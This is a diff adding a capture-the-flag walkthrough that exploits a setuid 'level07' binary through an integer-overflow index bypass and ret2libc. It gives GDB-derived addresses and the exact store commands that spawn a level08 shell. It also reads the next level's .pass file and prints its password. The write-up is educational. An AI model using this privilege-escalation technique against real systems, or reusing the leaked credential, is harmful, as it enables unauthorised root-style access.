@@ -1,0 +1,433 @@
+# Level07 Exploit Walkthrough: Integer Overflow + Ret2Libc
+
+## Overview
+This exploit combines integer overflow and ret2libc techniques to escalate from level07 to level08 privileges by bypassing stack canary protection and exploiting missing bounds checking.
+
+## Binary Analysis
+
+### Security Features
+```bash
+checksec --file=level07
+```
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
+```
+
+**Key Points:**
+- ✅ Stack Canary: Present (we'll bypass this)
+- ❌ NX disabled: Stack executable (we use ret2libc instead)
+- ❌ No PIE: Fixed memory addresses (exploitable)
+- ✅ Partial RELRO: Some protections
+
+### Program Functionality
+```bash
+./level07
+```
+The program is a "number storage service" with commands:
+- `store`: Store a number at an index
+- `read`: Read a number from an index
+- `quit`: Exit program
+
+## Vulnerability Discovery
+
+### 1. Index Validation Analysis
+From the disassembly, the validation logic is:
+```c
+if (index % 3 == 0 || (number >> 24) == 0xb7) {
+    puts("*** ERROR! ***");
+    puts("   This index is reserved for wil!");
+    return 1;
+}
+array[index] = number;  // No bounds checking!
+```
+
+**Critical Issues:**
+- Only checks `index % 3 == 0`
+- No upper/lower bounds validation
+- Allows out-of-bounds memory access
+
+### 2. Testing Basic Functionality
+```bash
+./level07
+```
+```
+Input command: store
+Number: 1337
+Index: 13
+Completed store command successfully
+
+Input command: read
+Index: 13
+Number at data[13] is 1337
+```
+
+### 3. Testing Protection Bypass
+```bash
+Input command: store
+Number: 42
+Index: 0
+*** ERROR! ***
+   This index is reserved for wil!
+```
+Index 0 is blocked because `0 % 3 == 0`.
+
+## Memory Layout Discovery
+
+### Step 1: Find Array Base Address
+```bash
+gdb ./level07
+```
+```gdb
+(gdb) set disassembly-flavor intel
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+(gdb) run
+```
+```
+Input command: read
+```
+```gdb
+Breakpoint 1, 0x080486dd in read_number ()
+(gdb) x $ebp+0x8
+0xffffd430:	0xffffd454
+```
+
+**Analysis:**
+- `0xffffd430`: Address where array pointer is stored
+- `0xffffd454`: Actual array base address
+
+### Step 2: Find EIP Location (Detailed Explanation)
+
+**Why we need to find EIP:** We want to overwrite the return address so when the function returns, it jumps to our code (system()) instead of the normal return location.
+
+**Method 1: Using GDB's info frame command**
+```bash
+gdb ./level07
+```
+```gdb
+(gdb) set disassembly-flavor intel
+(gdb) b main
+Breakpoint 1 at 0x8048729
+(gdb) run
+```
+```
+# Start the program and let it run normally
+Input command: store
+Number: 1337
+Index: 1
+Completed store command successfully
+Input command: quit
+```
+```gdb
+# When program is about to return from main, check the frame
+(gdb) info frame
+Stack level 0, frame at 0xffffd620:
+ eip = 0x804892b in main; saved eip 0xf7e45513
+ Saved registers:
+  ebx at 0xffffd60c, ebp at 0xffffd618, esi at 0xffffd610,
+  edi at 0xffffd614, eip at 0xffffd61c
+```
+
+**What this tells us:**
+- `eip at 0xffffd61c` means the return address is stored at memory address `0xffffd61c`
+- `saved eip 0xf7e45513` is the actual return address value stored there
+
+**Method 2: Manual calculation (Alternative approach)**
+```gdb
+(gdb) info registers ebp
+ebp            0xffffd618
+```
+```gdb
+# Return address is always at EBP + 4 in x86
+(gdb) x/x $ebp+4
+0xffffd61c:	0xf7e45513
+```
+
+**Method 3: Verify by reading the memory directly**
+```gdb
+(gdb) x/x 0xffffd61c
+0xffffd61c:	0xf7e45513
+```
+
+**Key Understanding:**
+- In x86 assembly, when a function is called, the return address is pushed onto the stack
+- This return address is what tells the program "where to go back to" when the function finishes
+- By overwriting this address, we control where the program jumps when it tries to return
+
+**Visual Stack Layout:**
+```
+Higher Memory Addresses
+┌─────────────────────┐
+│   Return Address    │ ← 0xffffd61c (EIP location - our target!)
+│   (EIP: 0xf7e45513) │
+├─────────────────────┤
+│   Saved EBP         │ ← 0xffffd618
+├─────────────────────┤
+│   Local Variables   │
+├─────────────────────┤
+│   Array[99]         │
+│   Array[98]         │
+│   ...               │
+│   Array[1]          │
+│   Array[0]          │ ← 0xffffd454 (Array start)
+└─────────────────────┘
+Lower Memory Addresses
+
+Distance: 0xffffd61c - 0xffffd454 = 456 bytes = 114 array elements
+```
+
+### Step 3: Calculate EIP Index
+```
+EIP address: 0xffffd61c
+Array base:  0xffffd454
+Difference:  0xffffd61c - 0xffffd454 = 456 bytes
+Array index: 456 ÷ 4 = 114
+```
+
+**Why index 114? (Simple Explanation)**
+Think of memory like a street with houses:
+- Our array starts at house #0xffffd454
+- The return address (EIP) is at house #0xffffd61c
+- Distance between them: 456 "steps"
+- Since each array element takes 4 "steps", we need: 456 ÷ 4 = 114 elements to reach EIP
+
+**In other words:** If we write to `array[114]`, we're actually writing to the return address!
+
+### Step 4: Verify EIP Index (Double-Check Our Math)
+
+**Test our calculation by reading index 114:**
+```bash
+./level07
+```
+```
+Input command: read
+Index: 114
+Number at data[114] is 4158936339
+```
+
+**Convert to hex and verify:**
+```bash
+# Convert decimal to hex
+python3 -c "print(hex(4158936339))"
+0xf7e45513
+```
+
+**Cross-check with GDB:**
+```gdb
+(gdb) x/x 0xffffd61c
+0xffffd61c:	0xf7e45513
+```
+
+✅ **Perfect Match!**
+- Array index 114 contains: `0xf7e45513`
+- EIP location contains: `0xf7e45513`
+- **Confirmed: Index 114 points to EIP**
+
+**What this proves:**
+- Our distance calculation (456 bytes) was correct
+- Our index calculation (456 ÷ 4 = 114) was correct
+- Writing to `array[114]` will overwrite the return address
+
+## Integer Overflow Exploitation
+
+### Problem: Index 114 is Protected
+```
+114 % 3 = 0  # Blocked by validation
+```
+
+### Solution: Integer Overflow (Simple Explanation)
+
+**The Problem:** We want index 114, but it's blocked because `114 % 3 = 0`
+
+**The Trick:** Use a HUGE number that "wraps around" to point to the same place!
+
+**Simple Math:**
+```
+Think of a clock:
+- 12 o'clock = 0 o'clock (they point to same place)
+- 13 o'clock = 1 o'clock (wraps around)
+
+Same with computer numbers:
+- Max 32-bit number: 4,294,967,295
+- If we go past this, it wraps back to 0
+
+Our magic number: 1,073,741,938
+Why this works:
+1. 1,073,741,938 % 3 = 1 (NOT 0, so allowed!)
+2. When multiplied by 4, it overflows and points to same place as index 114
+```
+
+**Verification:**
+```bash
+# Test that our magic number bypasses the protection
+1073741938 % 3 = 1  # ✅ Allowed (not 0)
+```
+
+**How the overflow works:**
+```c
+// What the program does:
+address = array_base + (index * 4)
+
+// With our magic number:
+address = array_base + (1073741938 * 4)
+// The multiplication overflows, wrapping around to point at index 114!
+```
+
+## Ret2Libc Setup
+
+### Step 1: Find system() Address
+```bash
+gdb ./level07
+```
+```gdb
+(gdb) b main
+(gdb) run
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+```
+
+Convert to decimal: `0xf7e6aed0 = 4159090384`
+
+### Step 2: Find "/bin/sh" String
+```gdb
+(gdb) info proc mappings
+```
+```
+0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+```
+```gdb
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+```
+
+Convert to decimal: `0xf7f897ec = 4160264172`
+
+### Step 3: Stack Layout for Ret2Libc
+```
+Index 114: system()     # EIP points here
+Index 115: <dummy>      # Fake return (unused)
+Index 116: "/bin/sh"    # Argument to system()
+```
+
+**Why index 116?**
+- Index 115: `115 % 3 = 1` (allowed, but we don't need it)
+- Index 116: `116 % 3 = 2` (allowed, perfect for our argument)
+
+## Exploit Execution
+
+### Complete Exploit Sequence
+```bash
+./level07
+```
+```
+Input command: store
+Number: 4159090384
+Index: 1073741938
+Completed store command successfully
+
+Input command: store
+Number: 4160264172
+Index: 116
+Completed store command successfully
+
+Input command: quit
+$ whoami
+level08
+```
+
+### What Happens Step by Step
+
+1. **First store command:**
+   - Number: `4159090384` (system() address)
+   - Index: `1073741938` (overflows to point to index 114)
+   - Result: EIP now contains system() address
+
+2. **Second store command:**
+   - Number: `4160264172` ("/bin/sh" address)
+   - Index: `116` (direct access, allowed)
+   - Result: system() argument is set
+
+3. **Quit command:**
+   - Program attempts to return
+   - EIP points to system() instead of normal return
+   - system() executes with "/bin/sh" as argument
+   - Shell spawned with level08 privileges
+
+## Technical Deep Dive
+
+### Integer Overflow Mechanics (Simplified)
+
+**Think of it like an odometer in a car:**
+```
+Normal odometer: 000000 to 999999, then rolls back to 000000
+
+32-bit computer numbers: 0 to 4,294,967,295, then rolls back to 0
+
+Our exploit:
+1. We use number 1,073,741,938
+2. Program multiplies by 4: 1,073,741,938 × 4 = 4,294,967,752
+3. This is bigger than max (4,294,967,295), so it "rolls over"
+4. Result points to the same memory location as index 114!
+```
+
+**In code:**
+```c
+// What happens in the program:
+int offset = 1073741938 * 4;  // = 4,294,967,752 (too big!)
+// Computer automatically wraps this around to a small number
+char* target = array_base + offset;  // Now points to index 114!
+*target = our_number;  // Overwrites the return address (EIP)
+```
+
+### Stack Canary Bypass
+- We don't corrupt the stack canary directly
+- Only overwrite the return address precisely
+- Canary remains intact, no `__stack_chk_fail` triggered
+
+### Memory Layout Visualization
+```
+Stack Layout:
+[...]
+[Array Index 114] ← EIP location (system address)
+[Array Index 115] ← Unused
+[Array Index 116] ← "/bin/sh" address
+[...]
+[Stack Canary]    ← Untouched
+[...]
+```
+
+## Verification
+
+### Check Privilege Escalation
+```bash
+$ whoami
+level08
+$ id
+uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1007(level07),100(users)
+```
+
+### Get Flag
+```bash
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
+
+## Key Learning Points
+
+1. **Integer Overflow**: Can bypass input validation
+2. **Precise Overwrites**: Bypass stack canaries without corruption
+3. **Memory Layout**: Understanding stack structure is crucial
+4. **Ret2Libc**: Effective when NX is disabled or for bypassing DEP
+5. **Privilege Escalation**: Setuid binaries can elevate privileges
+
+## Mitigation Strategies
+
+1. **Bounds Checking**: Validate array indices properly
+2. **Integer Overflow Protection**: Use safe arithmetic libraries
+3. **ASLR/PIE**: Make addresses unpredictable
+4. **Control Flow Integrity**: Detect unexpected function calls
+5. **Stack Cookies**: Already present but need better placement
+
+This exploit demonstrates how combining multiple techniques can overcome modern security mechanisms through careful analysis and precise execution.
